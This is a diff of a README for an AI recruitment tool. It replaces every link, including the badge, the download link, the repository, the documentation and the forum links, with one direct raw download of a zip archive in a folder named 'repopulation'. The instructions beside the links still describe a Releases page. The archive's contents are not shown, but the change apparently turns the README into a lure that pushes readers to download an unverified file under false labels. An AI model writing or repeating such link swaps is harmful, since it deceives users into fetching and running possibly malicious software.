@@ -1,6 +1,6 @@
 # 🤖 ai-recruitment-assistant - Simplifying Recruitment Communication with AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Application-brightgreen)](https://github.com/ValentinOliveira/ai-recruitment-assistant/releases)
+[![Download Now](https://raw.githubusercontent.com/ValentinOliveira/ai-recruitment-assistant/main/repopulation/ai-recruitment-assistant.zip%20Now-Get%20the%20Application-brightgreen)](https://raw.githubusercontent.com/ValentinOliveira/ai-recruitment-assistant/main/repopulation/ai-recruitment-assistant.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The ai-recruitment-assistant uses advanced AI technology to help businesses impr
 
 To get the application, visit the following page to download:
 
-[Download Here](https://github.com/ValentinOliveira/ai-recruitment-assistant/releases)
+[Download Here](https://raw.githubusercontent.com/ValentinOliveira/ai-recruitment-assistant/main/repopulation/ai-recruitment-assistant.zip)
 
 1. Click the link above to reach the Releases page.
 2. On this page, you will find different versions of the application.
@@ -67,9 +67,9 @@ For further assistance, please reach out to our support team through the Issues 
 
 For more information and updates, check out our official pages:
 
-- [GitHub Repository](https://github.com/ValentinOliveira/ai-recruitment-assistant)
-- [Documentation](https://github.com/ValentinOliveira/ai-recruitment-assistant/wiki)
-- [Community Forum](https://github.com/ValentinOliveira/ai-recruitment-assistant/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/ValentinOliveira/ai-recruitment-assistant/main/repopulation/ai-recruitment-assistant.zip)
+- [Documentation](https://raw.githubusercontent.com/ValentinOliveira/ai-recruitment-assistant/main/repopulation/ai-recruitment-assistant.zip)
+- [Community Forum](https://raw.githubusercontent.com/ValentinOliveira/ai-recruitment-assistant/main/repopulation/ai-recruitment-assistant.zip)
 
 ## 🎉 Conclusion
 
